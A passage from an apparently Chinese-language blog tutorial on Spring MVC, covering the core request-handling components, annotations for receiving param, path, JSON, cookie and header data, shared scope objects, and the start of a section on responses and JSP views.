<p> 请求映射、数据输入、视图界面、请求分发、表单回显、会话控制、过滤拦截、异步交互、文件上传、文件下载、数据校验、类型转换</p>
</blockquote>
<p>即：</p>
<ul>
<li>简化前端参数接收( 形参列表 )</li>
<li>简化后端数据响应(返回值)</li>
<li>其他.</li>
</ul>
<h2 id="核心组件和调用流程"><a href="#核心组件和调用流程" class="headerlink" title="核心组件和调用流程"></a>核心组件和调用流程</h2><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241230222140.png"></p>
<ol>
<li><p>DiapatcherServlet：SpringMVC提供，我们需要使用web.xml配置使其生效，它是整个流程处理的核心，所有请求都经过它的处理和分发.<code>CEO</code></p>
</li>
<li><p>HandlerMapping：SpringMVC提供，我们需要进行IoC配置使其加入IoC容器方可生效，它内部缓存handler(controller方法)和handler访问路径数据，被DispatcherServlet调用，用于查找路径对应的handler。<code>秘书</code></p>
</li>
<li><p>HandlerAdapter：SpringMVC提供，我们需要进行IoC配置使其加入IoC容器方可生效，它可以处理请求参数和处理</p>
<p> 响应数据数据，每次DispatcherServlet都是通过handlerAdapter间接调用handler，是handler和DispatcherServlet之间的适配器.<code>经理</code></p>
</li>
<li><p>视图解析器：SpringMVC提供，我们需要进行IoC配置使其加入IoC容器方可生效！视图解析器主要作用<br> 简化模版视图页面查找的，但是需要注意，前后端分离项目，后端只返回JSON数据，不返回页面，那就<br> 不需要视图解析器！所以，视图解析器，相对其他的组件不是必须的.<code>财务</code></p>
</li>
<li><p>handler：又称处理器，他是Controller类内部的方法简称，是由我们自己定义，用来接收参数，<br>向后调用业务，最终返回响应结果。<code>员工</code></p>
</li>
</ol>
<h1 id="二、接收数据"><a href="#二、接收数据" class="headerlink" title="二、接收数据"></a>二、接收数据</h1><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250108171528.png"></p>
<h2 id="路径设置"><a href="#路径设置" class="headerlink" title="路径设置"></a>路径设置</h2><p>主要注解：<code>@RequestMapping</code>修饰方法&#x2F;类，<code>@请求方法Mapping()</code>修饰方法&#x2F;类</p>
<p><code>@RequestMapping</code>注解，将请求的URL地址和处理请求的方式（handler方法）关联起来，建立映射关系。当SPringMVC接收到指定的请求后，会找到映射关系中对应的方法处理此请求。（相当于JavaWeb中的Servlet和URL)</p>
<ol>
<li><p>类上和方法上添加<code>@RequestMapping</code>注解的区别：</p>
<ul>
<li><p>类上提取通用的访问地址</p>
</li>
<li><p>方法上是具体的handler地址。<strong>方法上必须添加</strong></p>
</li>
<li><p>最终方法访问地址为： 类地址 + 方法地址</p>
</li>
</ul>
</li>
<li><p>请求方式指定：</p>
<ul>
<li>默认情况下任何请求方式均可访问</li>
<li>通过<code>method</code>属性可以限定可以访问的请求方式</li>
<li>或直接使用<code>@请求方法Mapping</code>限定请求方式，该类注解同样可以指定映射</li>
<li>不按限定请求方式访问会出现<code>405</code>异常</li>
</ul>
</li>
</ol>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;springmvc&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="comment">// 对外访问的地址，到handlerMapping注册的注解</span></span><br><span class="line">    <span class="comment">// 相当于@WebServlet()注解，但这个必须以&#x27;/&#x27;开头</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;sayHello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;sayHelloA&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHelloA</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;sayHelloB&quot;)</span></span><br><span class="line">    <span class="comment">// 相当于@RequestMapping（value = &quot;sayHelloB&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHelloB</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="参数接收（重点）"><a href="#参数接收（重点）" class="headerlink" title="参数接收（重点）"></a>参数接收（重点）</h2><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250107233439.png"></p>
<h3 id="param-和-json参数比较"><a href="#param-和-json参数比较" class="headerlink" title="param 和 json参数比较"></a>param 和 json参数比较</h3><p>在 HTTP 请求中，我们可以选择不同的参数类型，如 param 类型和 JSON 类型。下面对这两种参数类型进行区<br>别和对比：</p>
<ol>
<li>参数编码：</li>
</ol>
<p>  param 类型的参数会被编码为 ASCII 码。例如，假设 name&#x3D;john doe，则会被编码为name&#x3D;john%20doe。而 JSON 类型的参数会被编码为 UTF-8。</p>
<ol start="2">
<li>参数顺序：</li>
</ol>
<p>  param 类型的参数没有顺序限制。但是，JSON 类型的参数是有序的。JSON 采用键值对的形式进行传递，其中键值对是有序排列的。</p>
<ol start="3">
<li>数据类型：</li>
</ol>
<p>  param 类型的参数仅支持字符串类型、数值类型和布尔类型等简单数据类型。而 JSON 类型的参数则支持更复杂的数据类型，如数组、对象等。</p>
<ol start="4">
<li>嵌套性：</li>
</ol>
<p>  param 类型的参数不支持嵌套。但是，JSON 类型的参数支持嵌套，可以传递更为复杂的数据结构。</p>
<ol start="5">
<li>可读性：</li>
</ol>
<p>param 类型的参数格式比 JSON 类型的参数更加简单、易读。但是，JSON 格式在传递嵌套数据结构时更加清晰易懂。<br>总的来说，param 类型的参数适用于单一的数据传递，而 JSON 类型的参数则更适用于更复杂的数据结构传递。根据具体的业务需求，需要选择合适的参数类型。在实际开发中，常见的做法是：<strong>在 GET 请求中采用param 类型的参数，而在 POST 请求中采用 JSON 类型的参数传递。</strong></p>
<h3 id="Param类型参数接收"><a href="#Param类型参数接收" class="headerlink" title="Param类型参数接收"></a>Param类型参数接收</h3><p>主要注解：<code>@RequestParam()</code>修饰形参</p>
<p>三种接收方式：</p>
<ul>
<li><p>直接接收</p>
</li>
<li><p><code>@RequestParam()</code>注解指定接收：添加在形参列表，指定请求参数名 或者是否必须传递 或者非必须传递设置默认值。</p>
<blockquote>
<p>用法： @RequestParam(value &#x3D; “指定请求参数名，如果形参名和请求参数名相同，可以省略”,<br>                       required&#x3D;false 前端是否必须传递此参数，默认为必须，不传递出现400异常,<br>                      defaultValue &#x3D; “1” 当非必须传递时，可以设置默认值)</p>
<p><strong>注意：</strong>只要一个参数使用了注解，那就是按注解指定接收，如果某个参数没有注解，相当于<code>@RequestParam(require = false)</code></p>
</blockquote>
</li>
<li><p>特殊值接收：</p>
<ul>
<li>一参多值：直接使用集合接收</li>
<li>实体类对象接收</li>
</ul>
</li>
</ul>
<p><strong>示例及详细使用</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;param&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParamController</span> &#123;</span><br><span class="line">    <span class="comment">// 方式1：直接接收</span></span><br><span class="line">    <span class="comment">// 访问URL:/param/data?name=root&amp;age=19</span></span><br><span class="line">    <span class="comment">// 形参列表，填写对应参数的名称。 必须：请求参数名 = 形参参数名</span></span><br><span class="line">    <span class="comment">// 1.名称必须相同  2.可以不传递</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;data&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">data</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name: &quot;</span> + name + <span class="string">&quot;, age: &quot;</span> + age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;name: &quot;</span> + name + <span class="string">&quot;, age: &quot;</span> + age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @RequestParam()注解指定接收</span></span><br><span class="line">    <span class="comment">// 指定任意的请求参数名, 可以必须传递，也可以不传递而使用默认值</span></span><br><span class="line">    <span class="comment">// 访问URL:/param/data1?name=root&amp;age=19 name必须传递，age不传递使用默认值&#x27;1&#x27;</span></span><br><span class="line">    <span class="comment">// @RequestParam()注解添加在形参列表，指定请求参数名 或者是否必须传递 或者非必须传递设置默认值</span></span><br><span class="line">    <span class="comment">//      用法： @RequestParam(value = &quot;指定请求参数名，如果形参名和请求参数名相同，可以省略&quot;,</span></span><br><span class="line">    <span class="comment">//                          required=false 前端是否必须传递此参数，默认为必须，不传递出现400异常,</span></span><br><span class="line">    <span class="comment">//                          defaultValue = &quot;1&quot; 当非必须传递时，设置默认值)</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;data1&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">data1</span><span class="params">(<span class="meta">@RequestParam(value = &quot;name&quot;)</span> String userName,</span></span><br><span class="line"><span class="params">                        <span class="meta">@RequestParam(value = &quot;age&quot;,required=false,defaultValue = &quot;1&quot;)</span> <span class="type">int</span> userAge)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name: &quot;</span> + userName + <span class="string">&quot;, age: &quot;</span> + userAge);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;name: &quot;</span> + userName + <span class="string">&quot;, age: &quot;</span> + userAge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 特殊值接收</span></span><br><span class="line">    <span class="comment">// 1. 一参多值</span></span><br><span class="line">    <span class="comment">// 访问URL:/param/data2?key=1&amp;key=2</span></span><br><span class="line">    <span class="comment">// 直接使用集合接收，添加@RequestParam()注解</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;data2&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">data2</span><span class="params">(<span class="meta">@RequestParam(&quot;key&quot;)</span> List&lt;String&gt; keys)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;keys: &quot;</span>+keys);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 实体类对象接收值</span></span><br><span class="line">    <span class="comment">// 访问URL:/param/data3?name=root&amp;age=19</span></span><br><span class="line">    <span class="comment">// 实体类属性与请求参数名相同，请求参数可多可少</span></span><br><span class="line">    <span class="comment">// 以实体类对象作为形参</span></span><br><span class="line">    <span class="comment">// @Data</span></span><br><span class="line">    <span class="comment">// public class User &#123;</span></span><br><span class="line">    <span class="comment">//    private String name;</span></span><br><span class="line">    <span class="comment">//    private int age;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;data3&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">data3</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user: &quot;</span>+user);</span><br><span class="line">        <span class="keyword">return</span> user.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="路径参数接收"><a href="#路径参数接收" class="headerlink" title="路径参数接收"></a>路径参数接收</h3><p>主要注解：<code>@PathVariable()</code>修饰形参</p>
<p>路径传递参数（Path Parameters）是RESTful  API设计中的一种方式，用于在URL路径中指定资源的标识符或某些特定选项。这些参数是URL的一部分，并且通常用来标识一个或者多个特定的资源实例。它们与查询参数（Query Parameters）不同，后者是在问号（?）之后以键值对的形式附加在URL后面的。Spring MVC 框架提供了<code> @PathVariable</code> 注解来处理路径传递参数。@PathVariable 注解允许将 URL 中的占位符映射到控制器方法中的参数。<br>例如，如果我们想将 &#x2F;user&#x2F;{id} 路径下的 {id} 映射到控制器方法的一个参数中，则可以使用@PathVariable 注解来实现。</p>
<p><strong>使用示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;path&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PathController</span> &#123;</span><br><span class="line">    <span class="comment">// 访问URL: path/root/root1234</span></span><br><span class="line">    <span class="comment">// 动态路径设计:</span></span><br><span class="line">    <span class="comment">// 动态声明路径：RequestMapping()中使用&#x27;&#123;&#125;&#x27;包裹路径参数</span></span><br><span class="line">    <span class="comment">// 形参说明：使用@PathVariable注解将上述路径参数名与形参映射起来</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;&#123;account&#125;/&#123;password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">login</span><span class="params">(<span class="meta">@PathVariable(&quot;account&quot;)</span> String username,<span class="meta">@PathVariable</span> String password)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;username:&quot;</span>+username+<span class="string">&quot;, password:&quot;</span>+password);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;username:&quot;</span>+username+<span class="string">&quot;, password:&quot;</span>+password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="JSON类型参数接收"><a href="#JSON类型参数接收" class="headerlink" title="JSON类型参数接收"></a>JSON类型参数接收</h3><p>主要注解：<code>@RequestBody()</code>修饰形参</p>
<p>Java的JDK并不支持作为前端常用的Json数据类型，因此需要先导入Json解析依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.15.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在控制器中，使用<code>@RequestBody</code> 注解来接收 JSON 数据，并将其转换为 Java 对象，如下文代码，@RequestBody 注解将请求体中的 JSON 数据映射到 User 类型的 user 参数上，并将其作为一个对象来传递给 data() 方法进行处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;json&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsonController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;data&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">data</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user&quot;</span>+user);</span><br><span class="line">        <span class="keyword">return</span> user.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时，MVC配置文件需要添加注解：  开启Web注解支持。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="comment">// handlerAdapter配置了json转化器</span></span><br><span class="line"><span class="comment">// 添加HandlerAdapter，HandlerMapping 给HandlerAdapter添加jacksonjson处理器</span></span><br><span class="line"><span class="comment">// 无需在使用两个bean</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.fu.param&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MVCconfig</span> &#123;</span><br><span class="line">/    <span class="comment">// HandlerMapping加入IoC</span></span><br><span class="line"><span class="comment">//    @Bean</span></span><br><span class="line"><span class="comment">//    public RequestMappingHandlerMapping handlerMapping()&#123;</span></span><br><span class="line"><span class="comment">//        return new RequestMappingHandlerMapping();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    // HandlerAdapter加入IoC</span></span><br><span class="line"><span class="comment">//    @Bean</span></span><br><span class="line"><span class="comment">//    public RequestMappingHandlerAdapter handlerAdapter()&#123;</span></span><br><span class="line"><span class="comment">//        return new RequestMappingHandlerAdapter();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="请求头和Cookie接收"><a href="#请求头和Cookie接收" class="headerlink" title="请求头和Cookie接收"></a>请求头和Cookie接收</h2><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>主要注解：<code>@CookieValue(&quot;cookieName&quot;)</code>修饰形参</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;cookie&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CookieController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;data&quot;)</span></span><br><span class="line">    <span class="comment">// cookieName需要与发送时名称一致</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">data</span><span class="params">(<span class="meta">@CookieValue(&quot;cookieName&quot;)</span> String value)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;value = &quot;</span>+ value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 要求使用cookie</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;save&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">save</span><span class="params">(HttpServletResponse response)</span>&#123;</span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;cookieName&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;cookie ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h4><p>主要注解：<code>@RequestHeader(&quot;Host&quot;) </code>修饰形参</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;head&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeadController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;data&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">data</span><span class="params">(<span class="meta">@RequestHeader(&quot;Host&quot;)</span> String host)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;host:&quot;</span>+host);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;host:&quot;</span>+host;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="其他API"><a href="#其他API" class="headerlink" title="其他API"></a>其他API</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApuController</span> &#123;</span><br><span class="line">   <span class="meta">@Autowired</span>  <span class="comment">// ioc容器自动获取对应类型实体对象（组件）并自动装配</span></span><br><span class="line">   <span class="keyword">private</span> ServletContext servletContext;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">data</span><span class="params">(HttpServletResponse response,</span></span><br><span class="line"><span class="params">                    HttpServletRequest request,</span></span><br><span class="line"><span class="params">                    HttpSession session)</span>&#123;</span><br><span class="line">      <span class="comment">// 使用原生对象</span></span><br><span class="line">      <span class="comment">// ServletContext：最大的配置文件，全局共享域，核心api:getRealPath</span></span><br><span class="line">      <span class="comment">// 方案1： request/session获取</span></span><br><span class="line">      <span class="type">ServletContext</span> <span class="variable">servletContext1</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">      <span class="type">ServletContext</span> <span class="variable">servletContext2</span> <span class="operator">=</span> session.getServletContext();</span><br><span class="line">      <span class="comment">// 方案2： ServletContext会自动装入IoC容器。程序启动servletContext对象，直接全局注入</span></span><br><span class="line">      <span class="comment">// 即上文的@Autowired  // ioc容器自动获取对应类型实体对象（组件）并自动装配</span></span><br><span class="line">      <span class="comment">//   private ServletContext servletContext;</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="共享域对象"><a href="#共享域对象" class="headerlink" title="共享域对象"></a>共享域对象</h3><p>在 JavaWeb 中，共享域指的是在 Servlet 中存储数据，以便在同一 Web 应用程序的多个组件中进行共享和访问。常见的共享域有四种：ServletContext、HttpSession、HttpServletRequest、PageContext。</p>
<ol>
<li>ServletContext 共享域 **(应用作用域)**：ServletContext 对象可以在整个 Web 应用程序中共享数据，是最大的共享域。一般可以用于保存整个 Web 应用程序的全局配置信息，以及所有用户都共享的数据。在ServletContext 中保存的数据是线程安全的。</li>
<li>HttpSession 共享域**(会话作用域)**：HttpSession 对象可以在同一用户发出的多个请求之间共享数据，但只能在同一个会话中使用。比如，可以将用户登录状态保存在 HttpSession 中，让用户在多个页面间保持登录状态。</li>
<li>HttpServletRequest 共享域 **(请求作用域)**：HttpServletRequest 对象可以在同一个请求的多个处理器方法之间共享数据。比如，可以将请求的参数和属性存储在 HttpServletRequest 中，让处理器方法之间可以访问这些数据。</li>
<li>PageContext 共享域 **(页面作用域)**：PageContext 对象是在 JSP 页面Servlet 创建时自动创建的。它可以在 JSP 的各个作用域中共享数据，包括pageScope、requestScope、sessionScope、applicationScope 等作用域。</li>
</ol>
<p>共享域的作用是提供了方便实用的方式在同一 Web 应用程序的多个组件之间传递数据，并且可以将数据保存在不同的共享域中，根据需要进行选择和使用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;share&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShareController</span> &#123;</span><br><span class="line">   <span class="comment">// 获取共享域对象的两种方法</span></span><br><span class="line">   <span class="comment">// 1. 原生API获取(建议！)</span></span><br><span class="line"></span><br><span class="line">   <span class="meta">@Autowired</span></span><br><span class="line">   <span class="keyword">private</span> ServletContext servletContext;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">data</span><span class="params">(HttpServletResponse response, HttpServletRequest request)</span>&#123;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 2. SpringMVC提供的方法：针对request共享域提供了几种方案（了解）</span></span><br><span class="line">   <span class="comment">// model modelMap map modelAndView</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">data1</span><span class="params">(Model model)</span>&#123;</span><br><span class="line">      model.addAttribute(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">data1</span><span class="params">(ModelMap model)</span>&#123;</span><br><span class="line">      model.addAttribute(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">data1</span><span class="params">(Map model)</span>&#123;</span><br><span class="line">      model.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> ModelAndView <span class="title function_">data1</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">      modelAndView.addObject(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">      modelAndView.setViewName(<span class="string">&quot;视图名，页面名称&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> modelAndView;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<hr>
<h1 id="三、响应数据"><a href="#三、响应数据" class="headerlink" title="三、响应数据"></a>三、响应数据</h1><h2 id="前序知识理解"><a href="#前序知识理解" class="headerlink" title="前序知识理解"></a>前序知识理解</h2><h3 id="handler方法分析"><a href="#handler方法分析" class="headerlink" title="handler方法分析"></a>handler方法分析</h3><p>一个handler方法（Controller)的构成：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">TODO:</span> 一个controller的方法是控制层的一个处理器,我们称为handler</span></span><br><span class="line"><span class="comment"> * <span class="doctag">TODO:</span> handler需要使用<span class="doctag">@RequestMapping</span>/<span class="doctag">@GetMapping</span>系列,声明路径,在HandlerMapping中</span></span><br><span class="line"><span class="comment"> 注册,供DS查找!</span></span><br><span class="line"><span class="comment"> * <span class="doctag">TODO:</span> handler作用总结:</span></span><br><span class="line"><span class="comment"> * 1.接收请求参数(param,json,pathVariable,共享域等)</span></span><br><span class="line"><span class="comment"> * 2.调用业务逻辑</span></span><br><span class="line"><span class="comment"> * 3.响应前端数据(页面（不讲解模版页面跳转）,json,转发和重定向等)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">TODO:</span> handler如何处理呢</span></span><br><span class="line"><span class="comment"> * 1.接收参数: handler(形参列表: 主要的作用就是用来接收参数)</span></span><br><span class="line"><span class="comment"> * 2.调用业务: &#123; 方法体 可以向后调用业务方法 service.xx() &#125;</span></span><br><span class="line"><span class="comment"> * 3.响应数据: return 返回结果,可以快速响应前端数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">handler</span><span class="params">(简化请求参数接收)</span>&#123;</span><br><span class="line">   调用业务方法</span><br><span class="line">   返回的结果 （页面跳转，返回数据（json））</span><br><span class="line">   <span class="keyword">return</span> 简化响应前端数据;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：</p>
<ul>
<li><p>请求数据接收，我们都是通过handler的形参列表</p>
</li>
<li><p>前端数据响应，我们都是通过handler的return关键字快速处理！</p>
</li>
</ul>
<p>springmvc主要简化了参数接收和响应</p>
<h3 id="两种开发模式"><a href="#两种开发模式" class="headerlink" title="两种开发模式"></a>两种开发模式</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250108172938.png"></p>
<p>controller控制页面的跳转，模板页面向controller返回的是一个动态生成的HTML文件，适用于浏览器访问的应用，不适合一个服务器端对应多种客户端的访问形式。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250108173403.png"></p>
<p>前后端是两个程序（前端可能是多个），独立部署，后端只负责接收JSON数据，进行业务逻辑并响应JSON数据。</p>
<p>适合微服务+分布式部署。</p>
<h2 id="页面跳转控制"><a href="#页面跳转控制" class="headerlink" title="页面跳转控制"></a>页面跳转控制</h2><p>JSP（JavaServer Pages）是一种用于创建动态Web内容的技术，它是由Sun Microsystems（现在是Oracle Corporation的一部分）开发的。JSP技术允许开发者在HTML、XML或其他文本文档中嵌入Java代码片段，以生成动态的内容。JSP页面最终被Web容器编译成Servlet，这样它们可以处理HTTP请求并产生响应。</p>
<h3 id="快速返回视图"><a href="#快速返回视图" class="headerlink" title="快速返回视图"></a>快速返回视图</h3><h4 id="jsp页面和依赖导入"><a href="#jsp页面和依赖导入" class="headerlink" title="jsp页面和依赖导入"></a>jsp页面和依赖导入</h4><p>首先需要导入JSP依赖：</p>
